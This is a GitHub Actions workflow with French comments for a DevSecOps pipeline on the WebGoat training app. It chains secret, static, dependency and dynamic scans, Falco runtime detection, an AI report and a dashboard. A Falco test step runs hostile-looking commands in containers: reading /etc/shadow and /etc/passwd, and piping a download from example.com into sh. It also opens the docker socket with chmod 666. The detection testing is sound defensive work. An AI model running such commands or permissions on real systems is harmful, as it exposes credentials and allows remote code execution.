name: DevSecOps WebGoat Pipeline

on:
  push:
    branches: ["main"]

# Permissions minimales au niveau global
permissions:
  contents: read

jobs:
  # ═══════════════════════════════════════════════════════════════════
  # PHASE 1 — Scans statiques en PARALLÈLE
  # (secrets-scan, sast-scan, vulnerability-scan tournent simultanément)
  # ═══════════════════════════════════════════════════════════════════

  secrets-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Install Gitleaks
        run: |
          wget -qO- https://github.com/gitleaks/gitleaks/releases/download/v8.18.2/gitleaks_8.18.2_linux_x64.tar.gz | tar xz
          sudo mv gitleaks /usr/local/bin/

      - name: Run Gitleaks
        id: gitleaks
        # continue-on-error pour ne pas bloquer les autres scans,
        # mais le code de sortie est capturé pour le rapport.
        continue-on-error: true
        run: |
          gitleaks detect --source . --report-format sarif --report-path results.sarif
          echo "exit_code=$?" >> "$GITHUB_OUTPUT"

      - name: Annotate if secrets found
        if: steps.gitleaks.outputs.exit_code != '0'
        run: |
          echo "::error::Gitleaks a détecté des secrets dans le code source !"
          echo "::error::Consultez l'artefact gitleaks-results pour les détails."
          # Décommentez pour bloquer le pipeline sur détection de secrets :
          # exit 1

      # Nom d'artefact unifié → "reports" pour tout récupérer d'un coup
      - name: Upload Gitleaks Report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: report-gitleaks
          path: results.sarif

  sast-scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Analyze with SonarCloud
        uses: SonarSource/sonarcloud-github-action@v3.1.0
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN:  ${{ secrets.SONAR_TOKEN }}
        with:
          args: >
            -Dsonar.organization=yousseftrabelsi-dotcom
            -Dsonar.projectKey=yousseftrabelsi-dotcom_webgoat-pfe
            -Dsonar.java.binaries=.

  vulnerability-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install and Run Trivy
        id: trivy
        continue-on-error: true
        run: |
          curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh \
            | sh -s -- -b /usr/local/bin
          trivy fs --format json --output trivy-results.json --exit-code 1 --severity CRITICAL .
          echo "exit_code=$?" >> "$GITHUB_OUTPUT"

      - name: Annotate Trivy result
        run: |
          if [ "${{ steps.trivy.outputs.exit_code }}" != "0" ]; then
            echo "::warning::Trivy a trouvé des vulnérabilités CRITIQUES dans les dépendances !"
          else
            echo "Aucune vulnérabilité critique détectée par Trivy."
          fi

      - name: Upload Trivy Report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: report-trivy
          path: trivy-results.json

  # ═══════════════════════════════════════════════════════════════════
  # PHASE 2 — Scans dynamiques en PARALLÈLE
  # (dast-scan et falco-scan démarrent ensemble après la phase 1)
  # ═══════════════════════════════════════════════════════════════════

  dast-scan:
    needs: [secrets-scan, sast-scan, vulnerability-scan]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Start WebGoat
        run: docker run -d --name webgoat -p 8080:8080 webgoat/webgoat

      - name: Wait for WebGoat (healthcheck)
        run: |
          echo "Attente du démarrage de WebGoat..."
          for i in $(seq 1 30); do
            if curl -sf --max-time 3 http://localhost:8080/WebGoat/login > /dev/null 2>&1; then
              echo "WebGoat prêt après ${i} tentatives."
              exit 0
            fi
            echo "Tentative ${i}/30 — attente 5 s..."
            sleep 5
          done
          echo "::error::WebGoat n'a pas démarré dans les 150 secondes."
          docker logs webgoat
          exit 1

      - name: Prepare ZAP permissions
        run: chmod 777 .

      - name: OWASP ZAP Baseline Scan
        uses: zaproxy/action-baseline@v0.15.0
        with:
          target: "http://localhost:8080/WebGoat"
          fail_action: false

      - name: Upload ZAP Report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: report-zap
          path: report_html.html

  falco-scan:
    needs: [secrets-scan, sast-scan, vulnerability-scan]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
    
      - name: Install Docker (pour simulations)
        run: |
          sudo apt-get update
          sudo apt-get install -y docker.io
          sudo systemctl start docker
          sudo usermod -aG docker $USER
          sudo chmod 666 /var/run/docker.sock
    
      - name: Install Latest Falco + eBPF
        run: |
          curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | sudo gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
          echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] https://download.falco.org/packages/deb stable main" | sudo tee /etc/apt/sources.list.d/falcosecurity.list
          sudo apt-get update && sudo apt-get install -y falco
          sudo falco --version  # Devrait être ~0.43.x
    
      - name: Start Falco eBPF (JSON output)
        run: |
          sudo falco \
            -o json_output=true \
            -o json_include_output_property=true \
            -o engine.kind=ebpf \
            -o ebpf.probe=modern \
            > falco-results.json 2>&1 &
          FALCO_PID=$!
          echo "FALCO_PID=$FALCO_PID" >> $GITHUB_ENV
          sleep 5  # Init eBPF
    
      - name: Simulate Attacks (Toutes catégories)
        run: |
          echo "=== Simulations pour Notice/Warning/Error/Critical ==="
          # Notice: Shell in container
          docker run --rm ubuntu cat /etc/shadow
          # Warning: Write root
          docker run --rm ubuntu touch /etc/test_malicious
          # Error: Sensitive read
          docker run --rm alpine cat /etc/passwd
          # Critical: Suspicious process
          docker run --rm alpine sh -c "wget -qO- http://example.com | sh"
          sleep 10  # Capture events
    
      - name: Stop Falco & Parse
        if: always()
        run: |
          sudo kill $FALCO_PID || true
          sleep 2
          # Nettoie logs, extrait JSON
          grep '"output"' falco-results.json > falco-clean.json || touch falco-clean.json
          wc -l falco-clean.json  # Compte alertes
          echo "Alertes capturées : $(wc -l < falco-clean.json)"
    
      - name: Upload Falco Report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: report-falco
          path: falco*.json

  # ══════════════════════════════════════════════════════════════════
  # PHASE 3a — Analyse IA (lit TOUS les rapports des 5 outils)
  # ═══════════════════════════════════════════════════════════════════

  ai-agent-analysis:
    needs: [dast-scan, falco-scan]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # On télécharge chaque artefact individuellement pour être sûr de les avoir
      - name: Download Trivy report
        uses: actions/download-artifact@v4
        with:
          name: report-trivy
        continue-on-error: true

      - name: Download Gitleaks report
        uses: actions/download-artifact@v4
        with:
          name: report-gitleaks
        continue-on-error: true

      - name: Download ZAP report
        uses: actions/download-artifact@v4
        with:
          name: report-zap
        continue-on-error: true

      - name: Download Falco report
        uses: actions/download-artifact@v4
        with:
          name: report-falco
        continue-on-error: true

      - name: List available reports
        run: ls -lah *.json *.sarif *.html 2>/dev/null || echo "Certains rapports sont manquants."

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Install dependencies
        run: pip install google-genai

      - name: Run AI Agent
        env:
          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
        run: python scripts/ai_analyzer.py

      - name: Upload AI Report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: report-ai
          path: ai-security-summary.txt

  # ═══════════════════════════════════════════════════════════════════
  # PHASE 3b — Génération du Dashboard final
  # ═══════════════════════════════════════════════════════════════════

  generate-dashboard:
    needs: ai-agent-analysis
    if: always()
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write   # Pour commenter une PR si besoin

    steps:
      - uses: actions/checkout@v4

      # Téléchargement de chaque artefact dans un sous-dossier
      - name: Download all artifacts
        uses: actions/download-artifact@v4
        with:
          path: artifacts/
          merge-multiple: true

      - name: Flatten artifacts to working directory
        run: |
          find artifacts/ -type f | while read f; do
            cp "$f" . && echo "Copié : $f"
          done
          echo "=== Fichiers disponibles pour le dashboard ==="
          ls -lah *.json *.sarif *.html *.txt 2>/dev/null || true

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Install Python dependencies
        run: python -m pip install plotly markdown 

      - name: Generate Dashboard
        env:
          GITHUB_SHA:        ${{ github.sha }}
          GITHUB_RUN_NUMBER: ${{ github.run_number }}
          GITHUB_RUN_URL:    ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
          GITHUB_REF_NAME:   ${{ github.ref_name }}
          GITHUB_ACTOR:      ${{ github.actor }}
        run: python scripts/generate_dashboard.py

      - name: Upload Final Dashboard
        uses: actions/upload-artifact@v4
        with:
          name: DevSecOps-Final-Dashboard
          path: global_security_report.html
          retention-days: 30
